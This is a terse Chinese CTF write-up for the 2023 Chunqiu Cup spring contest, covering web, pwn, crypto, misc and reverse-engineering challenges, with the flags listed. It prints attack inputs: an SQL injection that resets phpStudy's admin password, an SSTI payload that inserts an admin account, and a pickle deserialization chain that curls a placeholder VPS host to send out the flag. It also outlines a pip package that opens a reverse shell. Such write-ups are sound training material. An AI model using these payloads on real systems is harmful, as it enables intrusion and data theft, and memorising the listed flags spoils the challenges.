# 2023 年春秋杯–网络安全联赛春季赛部分 WP

- 团队：天权信安网络安全团队

## 11 道题详解

### WEB
1. **Phpstudy**（phpstudy 漏洞 + SQL 注入）
   - 登录页加 `X-Requested-With: XMLHttpRequest` 头
   - 用户名 `sadmin';UPDATE ADMINS set PASSWORD='c26be8aaf53b15054896983b43eb6a65'`
   - admin/123456 登录
   - 计划任务执行 `cat /f*`

2. **Easypy**（pickle 反序列化 + 字符过滤）
   - 过滤 `R`, `bash`, `sh`
   - 走 `numpy.loads(numpydata)` 反序列化 pickle
   - 手搓 opcode 用 `c__builtin__map + pop0 0 + S'curl xxx:5555/...'` 绕 R
   - 监听 VPS 端口收 flag

3. **Phpstudy 取证**
   - tcp.srcport == 20 && tcp.dstport == 80 拿 BitLocker 恢复密钥
   - 拼接大量 PNG 文件得到 password: `856a-a56b6a705653`
   - DiskGenius 挂载取证取 flag
   - flag: `flag{f97d5b05-d312-46ac-919c-a140d7054ac5}`

4. **盲人会藏在哪里**
   - 补文件头得压缩包密码 `ChunJiSai7k7kbibi@!`
   - zsteg 提取 `ag{` 隐藏内容
   - flag: `flag{2c8ba897-0205-9bff-123d-281d12a24c38}`

5. **qqcms**（SSTI + SQL 注入）
   - 后台路由 /index/admin
   - SSTI: `{{loop sql='INSERT INTO qc_user VALUES (666, 16666666666, "管理员", "", "e10adc...", ...)'}}`
   - 文件包含漏洞读 flag

### PWN
6. **p2048**（栈溢出到后门）
   - 反复输入 t 触发溢出
   - flag: `flag{3834fe18-932d-4b34-9427-57565f0a803c}`

7. **piphack**（恶意 python 包）
   - 打包成 tar.gz 改 png 后缀
   - h->H 绕过过滤
   - pip install 反弹 shell
   - flag: `flag{4661747e-c7ed-4d2e-a2ee-315243be16a8}`

### CRYPTO
8. **checkin**（pell 方程 + 二项式展开）
   - N=1117 求 pell 方程最小解
   - flag1 = (enc1 - 1) / n^2 * invert(233, n)
   - flag2 = (enc2 % n^2 - 1) / n * invert(y1, n)
   - flag: `flag{11e89e28-4e27-47f0-a7c7-8e66c18881be}`

### MISC
9. **58 与 64**（base58 + base64 套娃）
   - 14268 个 txt 文件 base58 decode → 拼接 → base64 递归 decode
   - flag: `flag{640ce012-3d3a-446d-9d0e-5d2fe840063b}`

10. **ezrust**（work 目录）
    - 当前目录即 work
    - `./flag` 直接拿

### RE
11. **Poisoned_tea**（VMP 改 UPX + TEA 36 轮）
    - HxD 替换 VMP 字符串为 UPX
    - upx 4.0.2 脱壳
    - key[] = {0x05, 0x02, 9, 7, 0}（KEY1=9, KEY2=7）
    - TEA 36 轮解密
    - flag: `Thisisflag{cdfec405-3f4b-457e-92fe-f6446098ee2e}`

## 关键技巧
- **phpstudy 后台 SQL 注入**：UPDATE ADMINS 改密
- **pickle opcode 手搓**：绕过 R/bash/sh 字符过滤
- **BitLocker 取证**：恢复密钥格式 `120483-350966-...`
- **海量 PNG 拼接**：magick montage
- **zsteg**：PNG LSB 隐写检测
- **pell 方程**：连分数求最小解
- **VMP 改 UPX**：HxD 字符串替换
